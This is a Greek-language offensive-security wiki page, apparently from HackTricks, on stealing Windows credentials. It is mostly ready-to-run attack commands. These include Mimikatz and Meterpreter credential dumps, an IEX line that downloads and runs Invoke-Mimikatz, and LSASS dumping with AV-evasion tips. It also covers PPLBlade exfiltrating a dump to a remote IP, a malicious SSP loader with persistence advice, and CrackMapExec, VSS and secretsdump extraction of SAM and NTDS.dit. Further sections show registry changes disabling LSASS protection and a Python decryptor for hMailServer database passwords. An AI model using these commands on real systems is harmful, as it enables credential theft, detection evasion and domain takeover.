# Κλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Βρείτε άλλες δυνατότητες του Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από το να εξαγάγει ορισμένα διαπιστευτήρια.**

## Διαπιστευτήρια με το Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει, για να **αναζητήσετε κωδικούς πρόσβασης και hashes** στο σύστημα του θύματος.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Παράκαμψη του AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διεργασία lsass**, να **κατεβάσετε το dump** και να **εξαγάγετε** τα **credentials τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **εντοπίσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για τη δημιουργία dump του lsass.exe**, επειδή **εντοπίζουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthy** να περάσετε ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Δημιουργία dump του lsass με **comsvcs.dll**

Ένα DLL με όνομα **comsvcs.dll**, το οποίο βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνο για τη **δημιουργία dump της μνήμης διεργασίας** σε περίπτωση crash. Αυτό το DLL περιλαμβάνει μια **function** με όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί για να καλείται μέσω του `rundll32.exe`.\
Δεν έχει σημασία η χρήση των δύο πρώτων ορισμάτων, αλλά το τρίτο χωρίζεται σε τρία στοιχεία. Το πρώτο στοιχείο είναι το ID της διεργασίας για την οποία θα δημιουργηθεί dump, το δεύτερο είναι η τοποθεσία του αρχείου dump και το τρίτο είναι υποχρεωτικά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Αφού αναλυθούν αυτά τα τρία στοιχεία, το DLL δημιουργεί το αρχείο dump και μεταφέρει σε αυτό τη μνήμη της καθορισμένης διεργασίας.\
Μπορείτε να χρησιμοποιήσετε το **comsvcs.dll** για να δημιουργήσετε dump της διεργασίας lsass, αποφεύγοντας έτσι την ανάγκη μεταφόρτωσης και εκτέλεσης του procdump. Αυτή η μέθοδος περιγράφεται αναλυτικά στη διεύθυνση [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Για την εκτέλεση χρησιμοποιείται η ακόλουθη εντολή:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με το Task Manager**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διεργασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Dumping lsass με το procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα binary υπογεγραμμένο από τη Microsoft, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Ένα υπάρχον πλήρες crash dump συστήματος ή ένα συμπιεσμένο αντίγραφο σε προσβάσιμο φάκελο χρήστη μπορεί να διατηρεί υλικό διαπιστευτηρίων για offline ανάλυση. Ονόματα αρχείων όπως `MEMORY.DMP` και `MEMORY.7z` αποτελούν μόνο ενδείξεις για περαιτέρω έλεγχο: επαληθεύστε την προέλευση και την πρόσβαση και μην υποθέτετε ότι περιέχουν αξιοποιήσιμα ή τρέχοντα διαπιστευτήρια.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Εξαγωγή διαπιστευτηρίων εκτός σύνδεσης από snapshots VM

Ένα αναγνώσιμο backup VM μπορεί να περιέχει ένα αποθηκευμένο **image μνήμης guest**, ακόμη και χωρίς πρόσβαση στο guest που εκτελείται ή στο LSASS. Για το VMware, εντοπίστε τα metadata του snapshot `.vmsn` και το αντίστοιχο `.vmem`, αν υπάρχει· μην συγχέετε κανένα από τα δύο με ένα disk image `.vmdk`. Το `VMkatz` αναλύει εισόδους snapshot ή καταλόγου VM και μπορεί να ανακτήσει [διαπιστευτήρια συνεδριών σύνδεσης των Windows](credentials-mimikatz.md), όπως hashes και tickets, από τη μνήμη του guest. Μπορεί επίσης να επιθεωρήσει virtual disks για υλικό SAM/LSA. Προϋπόθεση είναι η πρόσβαση στα αρχεία backup, όχι δικαιώματα debug στο live VM.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Το παράδειγμα στο Checkpoint ανέκτησε ένα NT hash του **local** Administrator από snapshot μιας αυτόνομης VM. Το hash χρησιμοποιήθηκε για έλεγχο ταυτότητας στο domain μόνο αφού επιβεβαιώθηκε ξεχωριστά η επαναχρησιμοποίηση του κωδικού πρόσβασης· ένα local hash από backup δεν αποτελεί από μόνο του διαπιστευτήριο domain. Σε host με περιορισμένη μνήμη, το VMkatz μπορεί να σαρώσει και να αποδεσμεύσει σελίδες σταδιακά, αλλά η αντιγραφή του snapshot σε μεγαλύτερο host ανάλυσης μπορεί και πάλι να είναι προτιμότερη.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumpin lsass με PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο Protected Process Dumper που υποστηρίζει τη συσκότιση memory dump και τη μεταφορά του σε απομακρυσμένους σταθμούς εργασίας χωρίς να αποθηκεύεται στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Συσκότιση αρχείων memory dump για την αποφυγή μηχανισμών ανίχνευσης του Defender που βασίζονται σε signatures
3. Μεταφόρτωση memory dump με μεθόδους RAW και SMB χωρίς αποθήκευσή του στον δίσκο (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – απόρριψη LSASS μέσω SSP χωρίς MiniDumpWriteDump

Το Ink Dragon χρησιμοποιεί ένα dumper τριών σταδίων με την ονομασία **LalsDumper**, το οποίο δεν καλεί ποτέ το `MiniDumpWriteDump`, οπότε δεν ενεργοποιούνται ποτέ τα EDR hooks σε αυτό το API:<sup>[[3]](#references)</sup>

1. **Loader σταδίου 1 (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder που αποτελείται από 32 πεζούς χαρακτήρες `d`, το αντικαθιστά με την απόλυτη διαδρομή προς το `rtu.txt`, αποθηκεύει το τροποποιημένο DLL ως `nfdp.dll` και καλεί το `AddSecurityPackageA("nfdp","fdp")`. Έτσι, το **LSASS** φορτώνει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Στάδιο 2 μέσα στο LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, κάνει XOR σε κάθε byte με `0x20` και αντιστοιχίζει το αποκωδικοποιημένο blob στη μνήμη πριν μεταβιβάσει την εκτέλεση.
3. **Dumper σταδίου 3** – το αντιστοιχισμένο payload επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που επιλύονται από κατακερματισμένα ονόματα API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με το όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει ένα συμπιεσμένο dump του LSASS στο αρχείο και κλείνει το handle, ώστε να μπορεί να γίνει exfiltration αργότερα.

Σημειώσεις χειριστή:

* Κρατήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το στάδιο 1 αντικαθιστά το hard-coded placeholder με την απόλυτη διαδρομή προς το `rtu.txt`, επομένως ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η εγγραφή γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να ορίσετε μόνοι σας αυτήν την τιμή, ώστε το LSASS να επαναφορτώνει το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και, στη συνέχεια, δώστε τα στο Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Για την εκτέλεση του `lals.exe` απαιτούνται δικαιώματα admin/SeTcb, ώστε να επιτύχει το `AddSecurityPackageA`. Μόλις επιστρέψει η κλήση, το LSASS φορτώνει διαφανώς το κακόβουλο SSP και εκτελεί το στάδιο 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το απομακρύνει από το LSASS. Διαγράψτε την καταχώριση μητρώου και επανεκκινήστε το LSASS (με reboot) ή αφήστε την για μακροχρόνια persistence.

## CrackMapExec

### Εξαγωγή hashes SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump μυστικών LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump του NTDS.dit από τον DC-στόχο

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump του ιστορικού κωδικών πρόσβασης NTDS.dit από τον DC-στόχο

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό στο NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Κλοπή των SAM & SYSTEM

Αυτά τα αρχεία πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Όμως **δεν μπορείτε απλώς να τα αντιγράψετε με συνηθισμένο τρόπο**, επειδή είναι προστατευμένα.

### Από το Μητρώο

Ο ευκολότερος τρόπος να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφό τους από το Μητρώο:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Κατεβάστε** αυτά τα αρχεία στο μηχάνημα Kali σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Administrator.

Για διαφορετική διαδικασία που χρησιμοποιεί ήδη εκτεθειμένα snapshots σε ένα αναγνώσιμο network share, δείτε [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Χρήση του vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Αλλά μπορείτε να κάνετε το ίδιο και από το **Powershell**. Αυτό είναι ένα παράδειγμα για το **πώς να αντιγράψετε το αρχείο SAM** (η μονάδα δίσκου που χρησιμοποιείται είναι η «C:» και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, θα μπορούσατε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory** και περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **password hashes** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Σε αυτήν τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Πίνακας δεδομένων**: Είναι υπεύθυνος για την αποθήκευση λεπτομερειών σχετικά με αντικείμενα, όπως χρήστες και ομάδες.
- **Πίνακας συνδέσεων**: Καταγράφει σχέσεις, όπως τις συμμετοχές σε ομάδες.
- **Πίνακας SD**: Εδώ αποθηκεύονται οι **security descriptors** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης στα αποθηκευμένα αντικείμενα.

Η έρευνα του Christoffer Andersson στο επίπεδο της βάσης δεδομένων τεκμηριώνει αναλυτικότερα αυτούς τους πίνακες και τη συμπεριφορά τους ανά έκδοση.<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για την αλληλεπίδραση με αυτό το αρχείο, ενώ χρησιμοποιείται από το _lsass.exe_. Έτσι, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **στη μνήμη του `lsass`** (πιθανότατα μπορείτε να βρείτε τα δεδομένα στα οποία έγινε πιο πρόσφατη πρόσβαση, λόγω της βελτίωσης των επιδόσεων μέσω χρήσης **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται τρεις φορές:

1. Αποκρυπτογραφήστε το Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή σε κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο **NTDS.dit** με το **BOOTKEY** που είναι ειδικό για τον συγκεκριμένο DC και προέρχεται από το hive **SYSTEM** του. Επομένως, για την εξαγωγή διαπιστευτηρίων απαιτούνται τόσο το **NTDS.dit** όσο και το **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Μια ξεχωριστή [τεχνική ανακατεύθυνσης kernel handle-table](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) μπορεί να αντιγράψει ένα ήδη ανοιχτό NTDS file object χωρίς VSS, αλλά απαιτεί arbitrary kernel read/write primitive στον domain controller.<sup>[[16]](#references)</sup>

### Αντιγραφή του NTDS.dit με χρήση του Ntdsutil

Διαθέσιμο από τα Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Μπορείτε επίσης να χρησιμοποιήσετε το τέχνασμα [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Να θυμάστε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (και πάλι, χρησιμοποιήστε το τέχνασμα [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Μπορείτε επίσης να **τα εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο λογαριασμό domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Για **μεγάλα αρχεία NTDS.dit**, συνιστάται να τα εξαγάγετε χρησιμοποιώντας το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Εξάγονται όχι μόνο secrets, αλλά και ολόκληρα τα αντικείμενα και τα χαρακτηριστικά τους, για περαιτέρω εξαγωγή πληροφοριών, όταν έχει ήδη ανακτηθεί το ακατέργαστο αρχείο NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Το `SYSTEM` hive είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση secrets (NT & LM hashes, supplemental credentials όπως cleartext passwords, κλειδιά Kerberos ή trust, ιστορικά NT & LM passwords). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, σημαίες UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής password, περιγραφές λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο organizational units και συμμετοχές, trusted domains μαζί με τον τύπο, την κατεύθυνση και τα χαρακτηριστικά των trusts...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξαγάγετε credentials από διάφορα λογισμικά.

```
lazagne.exe all
```

## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** για να εξαχθούν οι κωδικοί πρόσβασης.

## Εξόρυξη ανενεργών RDP sessions και αποδυνάμωση των ελέγχων ασφαλείας

Το FinalDraft RAT του Ink Dragon περιλαμβάνει ένα tasker `DumpRDPHistory`, οι τεχνικές του οποίου είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή τηλεμετρίας τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και τη χρονική σήμανση της τελευταίας εγγραφής. Μπορείτε να αναπαραγάγετε τη λογική του FinalDraft με PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ενδείξεις εισερχόμενου RDP** – αναζητήστε στο αρχείο καταγραφής `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση), για να προσδιορίσετε ποιος διαχειρίστηκε το μηχάνημα:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Μόλις μάθετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο η **αποσυνδεδεμένη** συνεδρία του εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει το verifier και τα tokens του στο LSASS, όπου μπορούν στη συνέχεια να επαναχρησιμοποιηθούν μέσω SMB/WinRM για να αποκτήσετε το `NTDS.dit` ή να εγκαταστήσετε persistence σε domain controllers.

### Υποβαθμίσεις Registry που στοχεύει το FinalDraft

Το ίδιο implant αλλοιώνει επίσης αρκετά registry keys για να διευκολύνει την κλοπή credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Το `DisableRestrictedAdmin=1` απενεργοποιεί το Restricted Admin για εισερχόμενο RDP· **δεν** ενεργοποιεί το pass-the-hash μέσω αυτής της λειτουργίας. Η ρύθμιση της τιμής σε `0` επιτρέπει το Restricted Admin στον προορισμό, αλλά ο client πρέπει να ζητήσει `/RestrictedAdmin` ή να χρησιμοποιεί μια πολιτική που απαιτεί το Restricted Admin.<sup>[[14]](#references)</sup> Ένα hash από μόνο του δεν παρέχει δικαιώματα απομακρυσμένου διαχειριστή· δείτε τις [προϋποθέσεις ελέγχου ταυτότητας RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* Το `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το φιλτράρισμα διακριτικών UAC, ώστε οι τοπικοί διαχειριστές να λαμβάνουν απεριόριστα διακριτικά μέσω δικτύου.
* Το `DSRMAdminLogonBehavior=2` επιτρέπει στον διαχειριστή DSRM να συνδεθεί ενώ ο DC είναι online, παρέχοντας στους επιτιθέμενους έναν ακόμη ενσωματωμένο λογαριασμό με υψηλά προνόμια.
* Το `RunAsPPL=0` αφαιρεί τις προστασίες LSASS PPL, καθιστώντας την πρόσβαση στη μνήμη ασήμαντη για εργαλεία εξαγωγής, όπως το LalsDumper.

## Διαπιστευτήρια ρυθμίσεων hMailServer (μετά την παραβίαση)

Ελέγξτε τα ακριβή αρχεία ρυθμίσεων `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` και `C:\ProgramData\hMailServer\hMailServer.ini`, ανάλογα με τη διάταξη εγκατάστασης. Μια αναγνώσιμη, μη κενή τιμή `[Security] AdministratorPassword=` είναι hash κωδικού πρόσβασης διαχείρισης του hMailServer· δεν αποτελεί απόδειξη ότι πρόκειται για κωδικό πρόσβασης Windows Administrator. Αν ανακτηθεί αυτό το διαπιστευτήριο, οποιαδήποτε μετάβαση σε λογαριασμό Windows απαιτεί ανεξάρτητη επαλήθευση της επαναχρησιμοποίησης κωδικού πρόσβασης και των δικαιωμάτων σύνδεσης.

Για εγκαταστάσεις που χρησιμοποιούν βάση δεδομένων SQL CE, η ξεχωριστή τιμή `[Database] Password=` στο INI προστατεύει τη βάση δεδομένων. Σε παλαιότερες εγκαταστάσεις, αυτή η τιμή είναι κρυπτογραφημένη με Blowfish, χρησιμοποιώντας το στατικό κλειδί `THIS_KEY_IS_NOT_SECRET` και αντιμεταθέσεις endianness λέξεων των 4 byte. Χρησιμοποιήστε τη συμβολοσειρά hex από το INI με το ακόλουθο Python snippet:<sup>[[2]](#references)</sup>

Επιβεβαιώστε πρώτα ότι ο τρέχων λογαριασμός μπορεί να διαβάσει **και** το INI **και** το αντίστοιχο αρχείο βάσης δεδομένων SQL CE `.sdf`. Ο κωδικός πρόσβασης του INI προστατεύει τη βάση δεδομένων· είναι ξεχωριστός από τα hash λογαριασμών mailbox που είναι αποθηκευμένα σε αυτή. Επιθεωρήστε ή αναβαθμίστε ένα **αντίγραφο** μιας βάσης δεδομένων που χρησιμοποιείται· μην αγγίζετε ποτέ το ενεργό αρχείο.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Με τον κωδικό πρόσβασης σε απλό κείμενο, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε κλειδώματα αρχείων, φορτώστε τον πάροχο 32-bit και κάντε αναβάθμιση αν χρειάζεται πριν από την αναζήτηση των hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
